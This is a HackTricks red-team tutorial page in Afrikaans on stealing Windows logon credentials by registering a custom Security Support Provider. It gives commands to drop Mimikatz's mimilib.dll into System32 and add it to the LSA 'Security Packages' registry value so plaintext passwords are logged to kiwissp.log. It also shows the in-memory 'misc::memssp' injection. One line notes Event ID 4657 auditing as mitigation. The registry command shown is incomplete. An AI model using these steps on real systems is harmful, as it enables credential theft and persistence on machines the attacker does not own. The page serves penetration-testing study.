# Aangepaste SSP

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### Aangepaste SSP

[Leer wat 'n SSP (Sekuriteitsondersteuningsverskaffer) is hier.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **gelogde** in **klarteks** van die **kredensiale** wat gebruik word om toegang tot die masjien te verkry.

#### Mimilib

Jy kan die `mimilib.dll` binêre lêer wat deur Mimikatz voorsien word, gebruik. **Dit sal binne 'n lêer alle kredensiale in klarteks log.**\
Plaas die dll in `C:\Windows\System32\`\
Kry 'n lys van bestaande LSA-sekuriteitspakette:

{% code title="aanvaller@teiken" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Voeg `mimilib.dll` by die Lys van Sekuriteitsondersteuningsverskaffers (Security Packages) by:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
En na 'n herlaai kan alle geloofsbriewe in die teks in `C:\Windows\System32\kiwissp.log` gevind word.

#### In geheue

Jy kan dit ook direk in geheue inspuit met Mimikatz (let daarop dat dit effens onstabiel/nie werkend kan wees):
```powershell
privilege::debug
misc::memssp
```
Dit sal nie oorleef nie herlaai.

#### Versagting

Gebeurtenis ID 4657 - Oudit skepping/verandering van `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
